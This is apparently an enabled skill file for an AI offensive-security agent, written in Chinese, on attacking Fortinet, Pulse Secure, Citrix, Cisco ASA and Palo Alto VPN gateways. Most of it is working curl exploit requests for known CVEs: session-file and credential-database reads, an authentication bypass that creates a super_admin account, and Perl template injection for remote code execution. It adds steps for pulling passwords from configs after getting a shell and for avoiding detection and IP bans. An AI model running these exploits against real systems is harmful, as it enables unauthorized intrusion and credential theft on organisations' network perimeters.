---
name: edge-vpn-appliance
description: 边界与 VPN 设备攻击面：Fortinet / Pulse Secure / Citrix / GlobalProtect / Cisco ASA 的指纹识别、已知 CVE 利用路径、配置泄露与凭据提取
whenToUse: 目标外围存在 SSL VPN 或边界网关（FortiGate/Pulse/Citrix/ASA），作为进入内网的最短路径
role: internal
enabled: true
---

# 边界与 VPN 设备

> 这类设备是「一跳进内网」的最高性价比目标。厂商漏洞多为**预认证 RCE**。

## 一、指纹识别（先认设备，再谈打法）

```bash
# 通用识别
curl -skI https://TARGET/ | grep -iE "server|set-cookie|x-fortinet|citrix|pulse"
whatweb -a 3 https://TARGET

# 厂商专属路径
curl -sk https://TARGET/remote/login                      # Fortinet SSL VPN 登录页
curl -sk https://TARGET/+CSCOE+/logon.html                # Cisco ASA
curl -sk https://TARGET/dana-na/auth/url_default/welcome.cgi   # Pulse Secure
curl -sk https://TARGET/vpn/index.html                    # Citrix Gateway
curl -sk https://TARGET/global-protect/login.esp          # Palo Alto GlobalProtect
```

| 指纹特征 | 设备 |
|---|---|
| `FortiGate` / `/remote/login` / `SVPNCOOKIE` | Fortinet |
| `DSID` cookie / `/dana-na/` | Pulse Secure (Ivanti) |
| `NSC_` / `/vpn/index.html` | Citrix ADC |
| `webvpn` / `/+CSCOE+/` | Cisco ASA |
| `PAN_GP` / `/global-protect/` | Palo Alto |

## 二、Fortinet

**CVE-2018-13379（预认证路径穿越，读会话文件）**：

```bash
curl -sk "https://TARGET/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websessions"
# 命中返回含用户名/密码的会话表
```

**CVE-2022-40684（认证绕过，改管理员）**：

```bash
curl -sk -X PUT "https://TARGET/api/v2/cmdb/system/admin/ATTACKER" \
  -H "Forwarded: for=\"127.0.0.1\";by=\"127.0.0.1\"" \
  -H "User-Agent: Report Runner" -H "Content-Type: application/json" \
  -d '{"ssh-public-key1":"\"ssh-rsa AAAA...\"","accprofile":"super_admin","vdom":"root"}'
```

**CVE-2023-27997（XORtigate，预认证堆溢出）**：需专门 exp，非脚本一击。

判定：`sslvpn_websessions` 返回非空且含 `user=` 才算确认。

## 三、Pulse Secure / Ivanti

**CVE-2019-11510（任意文件读）**：

```bash
curl -sk "https://TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd"
# 读会话库（含明文/哈希凭据）
curl -sk "https://TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb"
```

**CVE-2021-22893（预认证 RCE）**：需要构造特定请求链，判断标志是能读到 `/data/runtime/mtmp/` 下的 lmdb。

判定：能读到 `data.mdb` 或 `/etc/passwd` = 成立；返回登录页 = 未打穿。

## 四、Citrix ADC / Gateway

**CVE-2019-19781（路径穿越 → RCE）**：

```bash
# 1. 验证穿越
curl -sk "https://TARGET/vpn/../vpns/portal/scripts/newbm.pl"
# 2. 写 XML 模板
curl -sk "https://TARGET/vpn/../vpns/portal/scripts/newbm.pl" \
  -H "NSC_USER: ../../netscaler/portal/templates/x" -H "NSC_NONCE: x" \
  -d 'url=http://x&title=x&desc=[% template.new("a",{block="x"}) %]&display_in_new_tab=1'
# 3. 触发（执行 Perl 模板）
curl -sk "https://TARGET/vpn/../vpns/portal/x.xml"
```

**CVE-2023-3519（预认证 RCE）**：需专门 PoC，判断标志是能写入 `/var/tmp/netscaler/`。

## 五、Cisco ASA

**CVE-2018-0101 / CVE-2020-3187（路径穿越读文件）**：

```bash
curl -sk "https://TARGET/+CSCOE+/session_password.html"
curl -sk "https://TARGET/+CSCOU+/../+CSCOE+/files/file_list.json?path=/"
```

判定：能列目录 = 成立。

## 六、Palo Alto GlobalProtect

**CVE-2019-1579 / CVE-2024-3400（命令注入，预认证）**：

```bash
# CVE-2024-3400 探测（SESSID cookie 注入）
curl -sk "https://TARGET/ssl-vpn/hipreport.esp" \
  -H "Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/PROBE.txt;"
curl -sk "https://TARGET/global-protect/portal/images/PROBE.txt" -o /dev/null -w "%{http_code}\n"
# 200 = 写入成功 = 可 RCE
```

## 七、拿到 shell 之后（这类设备的特殊性）

```bash
# Fortinet：先看配置里的凭据
show full-configuration | grep -iE "password|secret|psk"
# 常见落点：/data/config.conf、/var/config/rest/downloads/

# Pulse：会话库 → 解密（用已知密钥）
# Citrix：/nsconfig/ns.conf 里有全部 vserver 与 LDAP bind 密码
# ASA：/asa/version.txt、running-config 里的 VPN 用户

# 统一动作：拿 VPN 配置 → 提取内网路由与用户表
```

## 八、探测纪律（这类设备会记日志、会封 IP）

- 每个 CVE 只发 **1 次**探测请求，`-k` 跳过证书，不加脚本循环
- 命中 403/429 立即停，等 30 分钟
- **不做漏洞扫描器全量跑**（nuclei 的 `-tags fortinet` 会打几十条，容易被封）
- 记录每次请求的完整 URL + 响应码 + 响应长度（这是唯一证据）

## 九、判定纪律

| 现象 | 判定 |
|---|---|
| 登录页指纹匹配 | 只是识别，不是漏洞 |
| 路径穿越返回文件内容 | 已确认（要贴前 100 字节） |
| 返回 200 但是登录页 HTML | 未打穿，穿越被规范化 |
| CVE 版本匹配 | 只是「可能」，必须实测 |

**只报实测返回非预期内容的路径。**
